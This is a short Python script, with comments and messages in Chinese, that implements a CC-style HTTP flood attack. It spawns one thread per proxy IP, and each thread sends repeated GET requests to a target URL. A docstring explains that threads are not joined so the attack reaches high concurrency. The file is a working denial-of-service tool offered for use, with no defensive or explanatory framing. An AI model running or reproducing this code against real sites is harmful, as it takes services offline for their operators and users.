import requests
import threading


class CcCrawl:
    def __init__(self, concurrentnumber, target_url):
        self.url = target_url
        self.concurrentnumber = concurrentnumber

    def geturl(self):
        pass

    def parseurl(self, proxy):

        proxies = {'http': 'http://' + proxy}
        print("{}代理发起{}次攻击".format(proxies, self.concurrentnumber))
        # 每个ip攻击concurrentnumber次
        for i in range(0, self.concurrentnumber):
            requests.get(self.url, proxies=proxies)


    def run(self, ip_list):
        print("-"*50)
        print("开始一轮攻击")
        threadtasks = list()
        # 有多少个ip就发起多少个线程进行攻击
        for ip in ip_list:
            threadtasks.append(threading.Thread(target=self.parseurl, args=[ip]))

        # 线程全启动
        for num in range(len(threadtasks)):
            threadtasks[num].start()
        """
        请不要添加.join()
        这将会阻塞进程，发送大量请求需要时间，但cc攻击要实现高并发，阻塞进程就实现不了高并发
        """

